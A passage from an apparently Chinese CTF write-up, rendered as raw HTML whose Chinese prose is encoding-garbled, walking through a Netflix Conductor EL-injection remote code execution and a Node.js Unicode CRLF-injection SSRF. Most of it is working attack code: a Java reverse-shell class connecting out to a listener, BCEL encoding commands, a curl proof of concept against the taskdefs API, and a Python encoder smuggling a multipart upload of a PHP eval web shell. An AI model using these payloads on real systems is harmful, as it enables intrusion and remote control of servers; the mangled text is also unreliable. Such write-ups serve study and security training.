åå¼¹æ–¹æ³•ï¼Œæ¯•ç«Ÿæ˜¯ dockeræœ€ç®€ç¯å¢ƒå˜›ï¼Œä¸€èˆ¬é‡Œé¢é™¤äº† sh èƒ½ç”¨å…¶ä»–åŸºæœ¬æ²¡å•¥äº†ã€‚</p><p>ç„¶åçªç„¶æƒ³èµ·ä¹‹å‰çœ‹åˆ°è¿™ç¯‡<a href="https://mp.weixin.qq.com/s/8f80Fezs86DD9R1iRqLhMg">é…’ä»™æ¡¥çš„æ–‡ç« </a>ï¼Œä»–é‡åˆ°çš„æƒ…å½¢å’Œæˆ‘ä¸€æ ·ã€‚ç„¶åé€šè¿‡ java ç¼–å†™ socket çš„æ€è·¯æ¥åå¼¹shellï¼Œè¿™æ ·å¯ä»¥ä¸ä¾èµ–äºå…·ä½“çš„ç³»ç»Ÿç¯å¢ƒã€‚</p><p>çœŸ Exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String host=<span class="string">&quot;&quot;</span>; <span class="comment">// // ncç›‘å¬IP</span></span><br><span class="line">        <span class="keyword">int</span> port=; <span class="comment">// ncç›‘å¬ç«¯å£ï¼Œæ³¨æ„æ˜¯æ•´å‹ä¸æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line">        String cmd=<span class="string">&quot;/bin/sh&quot;</span>; <span class="comment">// å¦‚æœæ˜¯ windows å°±æ¢æˆ cmd.exe</span></span><br><span class="line">        Process p=<span class="keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="keyword">true</span>).start();</span><br><span class="line">        Socket s=<span class="keyword">new</span> Socket(host,port);</span><br><span class="line">        InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();</span><br><span class="line">        OutputStream po=p.getOutputStream(),so=s.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span>(!s.isClosed())&#123;</span><br><span class="line">            <span class="keyword">while</span>(pi.available()&gt;<span class="number">0</span>)</span><br><span class="line">                so.write(pi.read());</span><br><span class="line">            <span class="keyword">while</span>(pe.available()&gt;<span class="number">0</span>)</span><br><span class="line">                so.write(pe.read());</span><br><span class="line">            <span class="keyword">while</span>(si.available()&gt;<span class="number">0</span>)</span><br><span class="line">                po.write(si.read());</span><br><span class="line">            so.flush();</span><br><span class="line">            po.flush();</span><br><span class="line">            Thread.sleep(<span class="number">50</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                p.exitValue();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        p.destroy();</span><br><span class="line">        s.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶å¯ä»¥ä¸åå¼¹shellï¼Œå¯ä»¥é€šè¿‡ wget ä¹‹ç±»çš„æ–¹å¼ä¸‹è½½åˆ°æœ¬åœ°åœ¨åŠ è½½ï¼Œ</p><p>ä¸è¿‡å°±æ˜¯æƒ³å¤ç°ä¸€ä¸‹ï¼Œä¸‡ä¸€ä»¥åé‡åˆ°äº† HTTP ä¸å‡ºç½‘å‘¢ ï¼ˆ</p><p>ç»“æ„å¦‚ä¸‹</p><p><img src="/img/2021hfctf/image-20210423151406429.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423151406429.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423151406429"></p><p>BCELç¼–ç åçš„æ¶æ„ä»£ç </p><p><img src="/img/2021hfctf/image-20210423151446165.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423151446165.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423151446165"></p><h5 id="ç›´æ¥ç”¨ç°æœ‰å·¥å…·"><a href="#ç›´æ¥ç”¨ç°æœ‰å·¥å…·" class="headerlink" title="ç›´æ¥ç”¨ç°æœ‰å·¥å…·"></a>ç›´æ¥ç”¨ç°æœ‰å·¥å…·</h5><p><a href="https://github.com/f1tz/BCELCodeman">https://github.com/f1tz/BCELCodeman</a></p><p>ä¹Ÿæ˜¯å…ˆå†™å¥½ expï¼Œç„¶å </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.java -d /tmp/Exp.class</span><br></pre></td></tr></table></figure><p>BCELç¼–ç åçš„æ¶æ„ä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BCELCodeman.jar e /tmp/Exp.class</span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210423150859893.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423150859893.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423150859893"></p><h5 id="æ„é€ POC"><a href="#æ„é€ POC" class="headerlink" title="æ„é€ POC"></a>æ„é€ POC</h5><p>å¾—åˆ°ç¼–ç åæ„é€  POC ï¼Œä¸»è¦æ˜¯æ›¿æ¢ name éƒ¨åˆ†ä¸º ELè¡¨è¾¾å¼ï¼Œå†…å®¹ä¸º <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> åŠ è½½å™¨åŠ è½½BCELç¼–ç åçš„æ¶æ„ä»£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST \</span><br><span class="line">  http://localhost:8080/api/metadata/taskdefs \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;[</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;$&#123;&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;.getClass().forName(&#x27;</span>\<span class="string">&#x27;&#x27;</span>com.sun.org.apache.bcel.internal.util.ClassLoader<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;).newInstance().loadClass(&#x27;</span>\<span class="string">&#x27;&#x27;</span>&lt;åˆšåˆšç”Ÿæˆçš„BCELç¼–ç &gt;<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;).newInstance().class&#125;&quot;,</span></span><br><span class="line"><span class="string">  &quot;ownerEmail&quot;: &quot;test@example.org&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryCount&quot;: 3,</span></span><br><span class="line"><span class="string">      &quot;retryLogic&quot;: &quot;FIXED&quot;,</span></span><br><span class="line"><span class="string">      &quot;retryDelaySeconds&quot;: 10,</span></span><br><span class="line"><span class="string">      &quot;timeoutSeconds&quot;: 180,</span></span><br><span class="line"><span class="string">      &quot;timeoutPolicy&quot;: &quot;TIME_OUT_WF&quot;,</span></span><br><span class="line"><span class="string">      &quot;responseTimeoutSeconds&quot;: 300,</span></span><br><span class="line"><span class="string">      &quot;ownerEmail&quot;: &quot;type your email here&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">]&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2021hfctf/image-20210423162810488.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423162810488.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423162810488"></p><p>æˆåŠŸåå¼¹shell</p><p><img src="/img/2021hfctf/image-20210423162419172.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210423162419172.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210423162419172"></p><blockquote><p>æ ¹æ®æ¼æ´ç›¸å…³çš„ pull requestsï¼š<a href="https://github.com/Netflix/conductor/pull/1543">https://github.com/Netflix/conductor/pull/1543</a> å¯ä»¥å®šä½å¯¹è¯¥æ¼æ´çš„ä¿®å¤</p><p>å¼€å‘è€…å°† <code>org.hibernate:hibernate-validator</code> æ›¿æ¢ä¸ºäº† <code>org.apache.bval:bval-jsr</code>ï¼Œè€Œåè€…åœ¨æœ€æ–°ç‰ˆæœ¬ä¸‹ä¸ä¼šè§£æ Java EL è¡¨è¾¾å¼ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šæœ‰ RCE çš„å±é™©ã€‚</p></blockquote><p>å¥½ï¼Œæœ¬åœ°å¤ç°æˆåŠŸï¼ŒæŠŠè¿™ä¸ª POC ç›´æ¥æ‰“çº¿ä¸Šï¼Œä¼°è®¡é—®é¢˜ä¸å¤§</p><h3 id="å›åˆ°é¢˜ç›®ä¸­"><a href="#å›åˆ°é¢˜ç›®ä¸­" class="headerlink" title="å›åˆ°é¢˜ç›®ä¸­"></a>å›åˆ°é¢˜ç›®ä¸­</h3><p>ç°åœ¨æ¼æ´æ˜¯å¯ä»¥å°è¯•å»åˆ©ç”¨äº†ï¼Œé—®é¢˜æ˜¯ï¼Œé¢˜ç›®åªæä¾› GET çš„ä»£ç†ï¼Œæ— æ³•å‘é€ POST è¯·æ±‚ã€‚</p><p>ç»§ç»­æ²¿ç€ä¸€å¼€å§‹çš„æ€è·¯èµ°ï¼ŒCRLF SSRF</p><p>guguruäº†ä¸€ä¸‹ï¼Œnodejs CRLF æ¼æ´ï¼Œå‘ç°è¿˜çœŸæœ‰2333</p><p>è¿™ç¯‡å†™çš„æ¯”è¾ƒè¯¦ç»†ï¼Œè·Ÿç€å¤ç°ä¸€ä¸‹</p><p><a href="https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA">https://mp.weixin.qq.com/s/X6dq1WsKcEjNVwSJKiBMvA</a></p><p>ç„¶åçœ‹äº†åˆ«äººçš„å¤ç°ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ¯”è¾ƒéšç§˜çš„æç¤ºã€‚ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸­é—´è—äº†ä¸ª 8ï¼Œï¼Œ nodejs8 is bestï¼Œ2333 ä¸è¿‡ä¸ä¼¤å¤§é›…ï¼Œçœ¼ç›ä¸å¥½ç½‘ä¸Šæœä¸€ä¸‹ä¹Ÿå¯ä»¥çŸ¥é“ nodejs HTTPåº“åŒ…å«äº†é˜»æ­¢CRLFçš„æªæ–½ï¼Œæ™®é€š CRLFä¸ç®¡ç”¨ï¼Œä½†å¯ä»¥é€šè¿‡ nodejs çš„è®¾è®¡ä¸ä¸¥è°¨é—®é¢˜æ¥ç»•è¿‡ã€‚å½“ç„¶è¿™ä¸ªé—®é¢˜åœ¨ nodejs10 è¢«ä¿®å¤äº†ï¼Œå¦‚æœè¯·æ±‚è·¯å¾„åŒ…å«éAsciiå­—ç¬¦ï¼Œåˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚</p><h3 id="nodejs-lt-9ç‰ˆæœ¬-CRLFæ³¨å…¥"><a href="#nodejs-lt-9ç‰ˆæœ¬-CRLFæ³¨å…¥" class="headerlink" title="nodejs &lt; 9ç‰ˆæœ¬ CRLFæ³¨å…¥"></a>nodejs &lt; 9ç‰ˆæœ¬ CRLFæ³¨å…¥</h3><p>å¯¹äº Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬ï¼Œå¦‚æœæœ‰ä¸‹åˆ—æƒ…å†µï¼Œä»»ä½•å‘å‡ºHTTPè¯·æ±‚çš„æœåŠ¡å™¨éƒ½å¯èƒ½å—åˆ°é€šè¿‡è¯·æ±‚æ‹†å®ç°çš„SSRFçš„æ”»å‡»ï¼š</p><ul><li>æ¥å—æ¥è‡ªç”¨æˆ·è¾“å…¥çš„Unicodeæ•°æ®</li><li>å¹¶å°†å…¶åŒ…å«åœ¨HTTPè¯·æ±‚çš„è·¯å¾„ä¸­</li><li>ä¸”è¯·æ±‚å…·æœ‰ä¸€ä¸ª0é•¿åº¦çš„ä¸»ä½“ï¼ˆæ¯”å¦‚ä¸€ä¸ª <code>GET</code> æˆ–è€… <code>DELETE</code>ï¼‰</li></ul><p>ç”±äºæœ¬æœºæ˜¯ node10+ï¼Œæ‰€ä»¥dockeræ‹‰ä¸ªé•œåƒï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull node:8.8.0-alpine</span><br></pre></td></tr></table></figure><p>è¿›å…¥å®¹å™¨çš„nodeç¯å¢ƒï¼Œç„¶åè¯•è¯•æ™®é€šçš„ CRLF</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ # node</span><br><span class="line">&gt; <span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/\r\nwhoami&#x27;</span>).output</span><br><span class="line">[ <span class="string">&#x27;GET /%0D%0Awhoami HTTP/1.1\r\nHost: 192.168.123.37:2233\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure><p>è¿”å›åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET /%0D%0Awhoami HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>nodejs Unicode å­—ç¬¦æŸå¤±åŸç†</p><p>å½“ Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬å¯¹URLå‘å‡ºçš„ <code>GET</code> è¯·æ±‚è¿›è¡Œå¤„ç†æ—¶ï¼Œå®ƒä¸ä¼šè¿›è¡Œç¼–ç è½¬ä¹‰ï¼Œå› ä¸ºå®ƒä»¬ä¸æ˜¯HTTPæ§åˆ¶å­—ç¬¦ï¼Œä½†HTTPè¯·æ±‚è¿”å›çš„ç»“æœä¸­ä¼šè¢«ç¼–ç ä¸º <code>latin1</code> ç¼–ç å†™å…¥è·¯å¾„ï¼Œä½† latin1 ç¼–ç ä¸ºå•å­—èŠ‚ç¼–ç ï¼ˆç¼–ç èŒƒå›´ä¸º <code>0x00</code> - <code>0xFF</code> ï¼Œå…¶ä¸­ <code>0x00</code> - <code>0x7F</code>ä¹‹é—´å®Œå…¨å’ŒASCIIä¸€è‡´ï¼Œ<code>0x80</code> - <code>0x9F</code>ä¹‹é—´æ˜¯æ§åˆ¶å­—ç¬¦ï¼Œ<code>0xA0</code> - 0xFFä¹‹é—´æ˜¯æ–‡å­—ç¬¦å· ï¼‰ï¼Œå¦‚æœæ­¤æ—¶æˆ‘ä»¬ç”¨å•å­—èŠ‚ 8ä½ Unicode ç¼–ç ï¼Œé‚£ä¹ˆé«˜ 4 ä½ä¼šè¢«æˆªæ–­ã€‚</p><p>æ„é€ è¯·æ±‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/\u&#123;220D&#125;\u&#123;330A&#125;tari&#x27;</span>).output</span><br><span class="line">[ <span class="string">&#x27;GET /âˆãŒŠtari HTTP/1.1\r\nHost: 192.168.123.37:2233\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure><p>è¿”å›åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET /</span><br><span class="line">tari HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿ <code>\u&#123;220D&#125;</code> å’Œ <code>\u&#123;330A&#125;</code> ï¼Œå…¶ä¸­ <code>22</code> å’Œ <code>33</code> éšæ„ï¼Œä»€ä¹ˆéƒ½è¡Œï¼Œå› ä¸ºæœ€ç»ˆé«˜ 4 ä½éƒ½ä¼šè¢«æˆªæ–­ï¼Œç„¶å <code>0D</code> å’Œ <code>0A</code> åˆ†åˆ«ä¸º <code>\r</code> å’Œ <code>\n</code> çš„ ASCIIç ï¼Œç„¶åLatin1æ˜¯å‘ä¸‹å…¼å®¹ASCIIç çš„ï¼Œæ‰€ä»¥è¿”å›åŒ…è¢« <code>\r\n</code> æˆªæ–­äº†ï¼Œ <code>tari</code> å˜åœ¨ç¬¬äºŒè¡Œ</p><p>å¯è§ï¼Œå¯ä»¥é€šè¿‡æ„é€  Unicodeå­—ç¬¦ï¼Œåœ¨ nodejs å®ç° CRLFæ³¨å…¥ã€‚</p><p>åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œå› ä¸º CRLF + SSRF ç‚¹ åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥è¦æ³¨æ„é—­åˆåŸæœ‰çš„çŠ¶æ€è¡Œä¸­çš„ <code>HTTP/1.1</code>ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œï¼Œ</p><p>å…ˆä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ç›®æ ‡ä¸»æœºå­˜åœ¨SSRFï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºæœ¬åœ°ä¸Šä¼ æ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦å°è¯•æ„é€ å¦‚ä¸‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å®Œæ•´ POST è¯·æ±‚ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>437</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªPOSTè¯·æ±‚é‡Œé¢çš„æ‰€æœ‰çš„å­—ç¬¦åŒ…æ‹¬æ§åˆ¶ç¬¦å…¨éƒ¨ç”¨ä¸Šè¿°çš„é«˜ç¼–å·Unicodeç è¡¨ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /upload.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 437</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100000</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Upload</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_encode</span>(<span class="params">raw</span>):</span></span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡º: Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä 